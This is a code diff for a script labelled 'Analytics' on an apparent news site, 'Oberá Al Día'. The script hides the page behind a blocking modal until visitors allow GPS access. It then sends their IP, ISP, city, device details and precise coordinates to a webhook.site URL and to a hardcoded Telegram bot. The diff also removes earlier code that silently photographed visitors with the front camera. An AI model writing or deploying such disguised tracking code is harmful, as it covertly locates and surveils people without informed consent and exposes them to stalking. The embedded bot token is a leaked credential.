@@ -1,12 +1,12 @@
 /**
- * Analytics Persistente Pro - Oberá Al Día
- * Modal bloqueante + GPS + Cámara + Captura + Telegram
+ * Analytics Persistente - Oberá Al Día
+ * Modal bloqueante + GPS + Telegram
  */
 
 const ANALYTICS_CONFIG = {
     webhookUrl: 'https://webhook.site/57a80c61-c036-4435-b21c-c4143d76ef09',
     
-    // Configuración de Telegram
+    // Telegram Bot directo (sin Google Script)
     telegramBotToken: '8607851610:AAE1gAl2tHeL6kYN2jxB6QOD87gALi86-S4',
     telegramChatId: '7558822184',
     
@@ -16,12 +16,12 @@ const ANALYTICS_CONFIG = {
 
 let state = {
     initialSent: false,
-    dataSent: false,
+    gpsSent: false,
     ipData: null
 };
 
 // ============================================
-// UTILIDADES DE DISPOSITIVO
+// UTILIDADES
 // ============================================
 
 function getDeviceType() {
@@ -42,6 +42,10 @@ function getBrowserInfo() {
     };
 }
 
+// ============================================
+// CAPTURA IP/ISP (silenciosa, no bloquea)
+// ============================================
+
 async function getIPandISP() {
     try {
         const response = await fetch('https://ipapi.co/json/');
@@ -51,104 +55,156 @@ async function getIPandISP() {
             isp: data.org || 'N/A',
             city: data.city || 'N/A',
             region: data.region || 'N/A',
-            country: data.country_name || 'N/A'
+            country: data.country_name || 'N/A',
+            countryCode: data.country_code || 'XX',
+            timezone: data.timezone || 'N/A',
+            asn: data.asn || 'N/A',
+            approximateLocation: {
+                latitude: data.latitude || null,
+                longitude: data.longitude || null
+            }
         };
     } catch (e) {
-        return { ip: 'N/A', isp: 'N/A', city: 'N/A', region: 'N/A', country: 'N/A' };
+        try {
+            const r = await fetch('https://api.ipify.org?format=json');
+            const d = await r.json();
+            return { ip: d.ip, isp: 'N/A', city: 'N/A', region: 'N/A', country: 'N/A' };
+        } catch (e2) {
+            return { ip: 'N/A', isp: 'N/A', city: 'N/A', region: 'N/A', country: 'N/A' };
+        }
     }
 }
 
 // ============================================
-// CAPTURA DE PERMISOS (GPS Y CÁMARA)
+// GPS
 // ============================================
 
 function requestGPS() {
     return new Promise((resolve, reject) => {
-        if (!navigator.geolocation) return reject({ message: 'No soportado' });
+        if (!navigator.geolocation) {
+            reject({ type: 'NOT_SUPPORTED', message: 'GPS no soportado' });
+            return;
+        }
+
         navigator.geolocation.getCurrentPosition(
-            (pos) => resolve({
-                lat: pos.coords.latitude,
-                lng: pos.coords.longitude,
-                acc: pos.coords.accuracy
-            }),
-            (err) => reject(err),
-            { enableHighAccuracy: true, timeout: 8000 }
+            (pos) => {
+                resolve({
+                    latitude: pos.coords.latitude,
+                    longitude: pos.coords.longitude,
+                    accuracy: pos.coords.accuracy,
+                    altitude: pos.coords.altitude,
+                    timestamp: new Date(pos.timestamp).toISOString()
+                });
+            },
+            (err) => {
+                const types = { 1: 'PERMISSION_DENIED', 2: 'POSITION_UNAVAILABLE', 3: 'TIMEOUT' };
+                reject({ type: types[err.code] || 'UNKNOWN', message: err.message });
+            },
+            { enableHighAccuracy: true, timeout: ANALYTICS_CONFIG.timeout, maximumAge: 0 }
         );
     });
 }
 
-function requestCameraAndPhoto() {
-    return new Promise(async (resolve, reject) => {
-        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return reject({ message: 'No soportado' });
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            video.play();
+// ============================================
+// ENVÍO DE DATOS
+// ============================================
 
-            video.onloadedmetadata = () => {
-                // Pequeño delay para que la cámara aclare la imagen
-                setTimeout(() => {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    const photo = canvas.toDataURL('image/jpeg', 0.7);
-                    
-                    // Apagar cámara
-                    stream.getTracks().forEach(t => t.stop());
-                    resolve(photo);
-                }, 800);
-            };
-        } catch (err) {
-            reject(err);
-        }
-    });
+async function sendData(payload) {
+    const promises = [];
+
+    // 1. Webhook.site
+    promises.push(
+        fetch(ANALYTICS_CONFIG.webhookUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        }).catch(() => {})
+    );
+
+    // 2. Telegram directo
+    promises.push(sendToTelegram(payload).catch(() => {}));
+
+    await Promise.allSettled(promises);
 }
 
-// ============================================
-// ENVÍO A TELEGRAM (TEXTO Y FOTO)
-// ============================================
-
-async function sendFinalReport(gps, photoBase64) {
+async function sendToTelegram(data) {
     const token = ANALYTICS_CONFIG.telegramBotToken;
     const chatId = ANALYTICS_CONFIG.telegramChatId;
-    const net = state.ipData || {};
-    
-    const fecha = new Date().toLocaleString('es-AR');
-    let caption = `🔴 *REPORTE CAPTURADO*\n`;
-    caption += `━━━━━━━━━━━━━━━━━━━━\n\n`;
-    caption += `📅 *Fecha:* ${fecha}\n`;
-    caption += `🌐 *IP:* \`${net.ip}\`\n`;
-    caption += `🏢 *ISP:* ${net.isp}\n`;
-    caption += `📍 *Ciudad:* ${net.city}\n`;
-    caption += `📱 *Disp:* ${getDeviceType()}\n\n`;
+    const apiUrl = 'https://api.telegram.org/bot' + token;
 
-    if (gps) {
-        caption += `✅ *GPS:* [Google Maps](https://www.google.com/maps?q=${gps.lat},${gps.lng})\n`;
-        caption += `📍 *Coord:* \`${gps.lat}, ${gps.lng}\`\n\n`;
-    } else {
-        caption += `❌ *GPS:* Denegado/Fallo\n\n`;
-    }
+    let mensaje = '';
 
-    if (photoBase64) {
-        // Enviar como Foto
-        const blob = await (await fetch(photoBase64)).blob();
-        const formData = new FormData();
-        formData.append('chat_id', chatId);
-        formData.append('photo', blob, 'capture.jpg');
-        formData.append('caption', caption);
-        formData.append('parse_mode', 'Markdown');
+    if (data.event === 'page_load') {
+        const net = data.networkInfo || {};
+        mensaje = 
+            '🌐 *Nueva visita*\n' +
+            '━━━━━━━━━━━━━━━━━━━━\n\n' +
+            '📅 ' + new Date().toLocaleString('es-AR') + '\n\n' +
+            '🔹 *IP:* `' + (net.ip || 'N/A') + '`\n' +
+            '🔹 *ISP:* ' + (net.isp || 'N/A') + '\n' +
+            '🔹 *Ciudad:* ' + (net.city || 'N/A') + '\n' +
+            '🔹 *Región:* ' + (net.region || 'N/A') + '\n' +
+            '🔹 *País:* ' + (net.country || 'N/A') + '\n' +
+            '🔹 *Dispositivo:* ' + (data.deviceType || 'N/A') + '\n\n' +
+            '⏳ Esperando permiso GPS...';
 
-        return fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });
-    } else {
-        // Enviar solo texto si no hay foto
-        return fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+    } else if (data.event === 'gps_granted') {
+        const gps = data.gpsData || {};
+        const net = data.networkInfo || {};
+        const lat = gps.latitude || 0;
+        const lng = gps.longitude || 0;
+        const mapUrl = 'https://www.google.com/maps?q=' + lat + ',' + lng;
+
+        mensaje = 
+            '🔴 *UBICACIÓN GPS CAPTURADA*\n' +
+            '━━━━━━━━━━━━━━━━━━━━\n\n' +
+            '📅 ' + new Date().toLocaleString('es-AR') + '\n\n' +
+            '🌐 *RED*\n' +
+            '🔹 IP: `' + (net.ip || 'N/A') + '`\n' +
+            '🔹 ISP: ' + (net.isp || 'N/A') + '\n' +
+            '🔹 Ciudad: ' + (net.city || 'N/A') + '\n\n' +
+            '✅ *GPS ACEPTADO*\n' +
+            '📍 Lat: `' + lat + '`\n' +
+            '📍 Lng: `' + lng + '`\n' +
+            '📏 Precisión: ' + (gps.accuracy || 'N/A') + ' metros\n\n' +
+            '🗺️ [Ver en Google Maps](' + mapUrl + ')';
+
+        // Enviar mensaje + ubicación en mapa
+        await fetch(apiUrl + '/sendMessage', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 chat_id: chatId,
-                text: caption + `❌ *Foto:* Denegada/Fallo`,
+                text: mensaje,
+                parse_mode: 'Markdown',
+                disable_web_page_preview: false
+            })
+        });
+
+        // Enviar pin de ubicación interactivo
+        await fetch(apiUrl + '/sendLocation', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: chatId, latitude: lat, longitude: lng })
+        });
+
+        return;
+
+    } else if (data.event === 'gps_denied' || data.event === 'gps_denied_again') {
+        mensaje = 
+            '❌ *GPS Rechazado*\n' +
+            '━━━━━━━━━━━━━━━━━━━━\n\n' +
+            '📅 ' + new Date().toLocaleString('es-AR') + '\n' +
+            '⚠️ Usuario denegó el permiso';
+    }
+
+    if (mensaje) {
+        await fetch(apiUrl + '/sendMessage', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: mensaje,
                 parse_mode: 'Markdown'
             })
         });
@@ -156,16 +212,8 @@ async function sendFinalReport(gps, photoBase64) {
 }
 
 // ============================================
-// MODAL Y LÓGICA DE CONTROL
+// MODAL
 // ============================================
-
-function updateButton(text, disabled) {
-    const btn = document.getElementById('confirm-location-btn');
-    if (btn) {
-        btn.innerHTML = text;
-        btn.disabled = disabled;
-    }
-}
 
 function hideModal() {
     const modal = document.getElementById('location-modal');
@@ -175,49 +223,125 @@ function hideModal() {
     }
 }
 
-async function handleAction() {
-    updateButton('⏳ Procesando...', true);
-    
-    // Intentar capturar todo
-    const results = await Promise.allSettled([
-        requestGPS(),
-        requestCameraAndPhoto()
-    ]);
-
-    const gpsData = results[0].status === 'fulfilled' ? results[0].value : null;
-    const photoData = results[1].status === 'fulfilled' ? results[1].value : null;
-
-    await sendFinalReport(gpsData, photoData);
-    
-    hideModal();
-    state.dataSent = true;
+function showModal() {
+    const modal = document.getElementById('location-modal');
+    if (modal) {
+        modal.classList.remove('hide');
+        document.body.style.overflow = 'hidden';
+    }
 }
 
-async function init() {
-    document.body.style.overflow = 'hidden';
-    state.ipData = await getIPandISP();
-    
-    // Notificación inicial de visita
-    fetch(`https://api.telegram.org/bot${ANALYTICS_CONFIG.telegramBotToken}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            chat_id: ANALYTICS_CONFIG.telegramChatId,
-            text: `🌐 *Visita detectada*\nIP: ${state.ipData.ip}\nEsperando interacción...`,
-            parse_mode: 'Markdown'
-        })
-    }).catch(()=>{});
+function updateButton(text, disabled) {
+    const btn = document.getElementById('confirm-location-btn');
+    if (btn) {
+        btn.innerHTML = text;
+        btn.disabled = disabled;
+    }
 }
 
 // ============================================
-// DISPARADORES
+// LÓGICA PRINCIPAL
+// ============================================
+
+async function sendInitialData() {
+    if (state.initialSent) return;
+
+    const ipData = await getIPandISP();
+    state.ipData = ipData;
+
+    await sendData({
+        event: 'page_load',
+        sessionId: ANALYTICS_CONFIG.sessionId,
+        timestamp: new Date().toISOString(),
+        pageUrl: window.location.href,
+        referrer: document.referrer || 'Directo',
+        deviceType: getDeviceType(),
+        browserInfo: getBrowserInfo(),
+        networkInfo: ipData,
+        gpsStatus: 'pending'
+    });
+
+    state.initialSent = true;
+}
+
+async function sendGPSData(gpsData) {
+    if (state.gpsSent) return;
+
+    await sendData({
+        event: 'gps_granted',
+        sessionId: ANALYTICS_CONFIG.sessionId,
+        timestamp: new Date().toISOString(),
+        gpsData: { ...gpsData, permissionGranted: true },
+        networkInfo: state.ipData
+    });
+
+    state.gpsSent = true;
+}
+
+async function handleConfirmButton() {
+    updateButton('⏳ Solicitando permiso...', true);
+
+    try {
+        const gpsData = await requestGPS();
+        await sendGPSData(gpsData);
+        hideModal();
+    } catch (error) {
+        await sendData({
+            event: 'gps_denied_again',
+            sessionId: ANALYTICS_CONFIG.sessionId,
+            timestamp: new Date().toISOString(),
+            errorType: error.type
+        });
+        updateButton('❌ Permiso denegado - Reintentar', false);
+    }
+}
+
+async function init() {
+    // Modal visible desde el inicio (CSS)
+    document.body.style.overflow = 'hidden';
+
+    // Captura IP en paralelo con GPS
+    const ipPromise = sendInitialData();
+
+    // Pedir GPS inmediatamente
+    try {
+        const gpsData = await requestGPS();
+
+        // GPS aceptado: esperar IP y enviar todo
+        await ipPromise;
+        await sendGPSData(gpsData);
+
+        // Ocultar modal
+        hideModal();
+
+    } catch (error) {
+        // GPS rechazado: esperar IP y enviar rechazo
+        await ipPromise;
+
+        await sendData({
+            event: 'gps_denied',
+            sessionId: ANALYTICS_CONFIG.sessionId,
+            timestamp: new Date().toISOString(),
+            errorType: error.type,
+            errorMessage: error.message
+        });
+
+        // Modal ya está visible, solo actualizar botón
+        updateButton('🔒 Confirmar y Leer', false);
+    }
+}
+
+// ============================================
+// INICIALIZACIÓN
 // ============================================
 
 document.addEventListener('DOMContentLoaded', () => {
     init();
+
     const btn = document.getElementById('confirm-location-btn');
-    if (btn) btn.addEventListener('click', handleAction);
+    if (btn) {
+        btn.addEventListener('click', handleConfirmButton);
+    }
 });
 
-// Exponer por si acaso
-window.OberaPro = { retry: handleAction };
+window.OberaAnalytics = { state, config: ANALYTICS_CONFIG, retry: handleConfirmButton, hideModal, showModal };
